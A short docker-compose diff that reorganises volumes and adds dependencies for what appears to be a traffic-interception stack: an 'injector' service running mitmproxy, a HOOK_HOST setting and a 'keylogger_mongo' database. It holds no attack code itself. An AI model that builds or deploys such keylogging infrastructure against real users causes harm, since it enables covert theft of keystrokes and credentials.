@@ -7,7 +7,7 @@ services:
     build:
       context: ./injector
     volumes:
-      - ./mitmproxy:/root/.mitmproxy
+      - ./data/mitmproxy:/root/.mitmproxy
     ports:
       - 8080:8080
     environment:
@@ -28,7 +28,13 @@ services:
       - 7000:7000
     restart: unless-stopped
     volumes:
-      - ./mitmproxy:/data:ro
+      - ./data/mitmproxy:/data/mitmproxy
+      - ./data/haproxy:/data/haproxy
+    depends_on:
+      - injector
+      - mongo
+    environment:
+      - HOOK_HOST=$HOOK_HOST
 
   mongo:
     container_name: keylogger_mongo
